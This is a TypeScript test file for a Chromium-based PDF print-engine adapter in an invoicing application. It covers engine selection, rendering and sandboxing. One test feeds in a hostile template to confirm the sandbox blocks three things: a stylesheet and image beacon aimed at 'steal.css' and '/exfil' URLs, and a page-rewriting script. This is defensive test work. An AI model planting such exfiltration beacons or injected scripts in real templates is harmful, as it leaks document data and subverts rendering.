import { AppError } from "@dulja/contracts";
import { afterAll, describe, expect, it } from "vitest";
import { pdfText } from "../../../../tests/support/pdf";
import {
  closeChromium,
  engineFor,
  PDF_ENGINES,
  PDF_MAGIC,
  RENDER_TIMEOUT_MS,
} from "../../src/print/engines";

const HTML = [
  '<!doctype html><html lang="ar" dir="rtl"><head><meta charset="utf-8"></head>',
  "<body><h1>فاتورة ضريبية</h1><p>Invoice INV-000001 · 150.0000 MYR</p></body></html>",
].join("");

/** These cases launch a real headless Chromium (Playwright); the browser is closed after the file. */
describe("the ADR-0016 engine adapters", () => {
  afterAll(async () => {
    await closeChromium();
  });

  it("holds an adapter for exactly the ADR-0016 value set", () => {
    expect(Object.keys(PDF_ENGINES)).toEqual(["chromium"]);
    expect(engineFor("chromium").code).toBe("chromium");
  });

  it("refuses react-pdf with ERR_PRINT_ENGINE_UNSUPPORTED, naming why (ADR 0032)", () => {
    let raised: AppError | null = null;
    try {
      engineFor("react-pdf");
    } catch (e) {
      raised = e as AppError;
    }
    expect(raised).toBeInstanceOf(AppError);
    expect(raised!.code).toBe("ERR_PRINT_ENGINE_UNSUPPORTED");
    expect(raised!.status).toBe(422);
    expect(raised!.detail).toMatch(/react-pdf renders a React component, not template text/);
  });

  it("refuses typst — a near-miss ADR 0016 records, not a value in the set", () => {
    expect(() => engineFor("typst")).toThrow(
      /'typst' has no print adapter; ADR 0016 admits chromium/,
    );
  });

  it("refuses a code ADR 0016 does not name at all, and never reads the prototype", () => {
    expect(() => engineFor("wkhtmltopdf")).toThrow(/wkhtmltopdf/);
    expect(() => engineFor("toString")).toThrow(AppError);
  });

  it("chromium renders both directions to real PDF bytes", async () => {
    const engine = engineFor("chromium");
    for (const dir of ["ltr", "rtl"] as const) {
      const bytes = await engine.render(HTML, { paper: "A4", dir });
      expect(bytes.byteLength).toBeGreaterThan(1_000);
      expect(bytes.slice(0, PDF_MAGIC.length)).toEqual(PDF_MAGIC);
    }
  }, 120_000);

  it("renders a template as DATA: scripts do not run and no request leaves the page", async () => {
    // A tenant-authored body that tries all three doors — a subresource fetch to a closed local port, a
    // stylesheet, and a script that rewrites the page. With the sandbox in place the render finishes well
    // inside RENDER_TIMEOUT_MS (an un-aborted fetch to a dead port would hang `load`), the script's text never
    // appears, and the original text does.
    const hostile = [
      '<!doctype html><html lang="en" dir="ltr"><head><meta charset="utf-8">',
      '<link rel="stylesheet" href="http://127.0.0.1:9/steal.css">',
      "</head><body><p>Original text 150.0000</p>",
      '<img src="http://127.0.0.1:9/exfil?doc=150.0000" alt="">',
      "<script>document.body.innerHTML = '<p>pwned by script</p>';</script>",
      "</body></html>",
    ].join("");
    const started = performance.now();
    const bytes = await engineFor("chromium").render(hostile, { paper: "A4", dir: "ltr" });
    expect(performance.now() - started).toBeLessThan(RENDER_TIMEOUT_MS);
    const text = (await pdfText(bytes)).join(" ");
    expect(text).toContain("Original text 150.0000");
    expect(text).not.toContain("pwned");
  }, 120_000);

  it("recovers after the browser is closed underneath it — one dead handle never poisons the process", async () => {
    const engine = engineFor("chromium");
    await engine.render(HTML, { paper: "A4", dir: "ltr" });
    await closeChromium();
    const bytes = await engine.render(HTML, { paper: "A4", dir: "ltr" });
    expect(bytes.slice(0, PDF_MAGIC.length)).toEqual(PDF_MAGIC);
  }, 120_000);

  it("maps the three paper values without throwing", async () => {
    const engine = engineFor("chromium");
    for (const paper of ["A4", "A5", "receipt"]) {
      expect((await engine.render(HTML, { paper, dir: "ltr" })).byteLength).toBeGreaterThan(500);
    }
  }, 120_000);
});
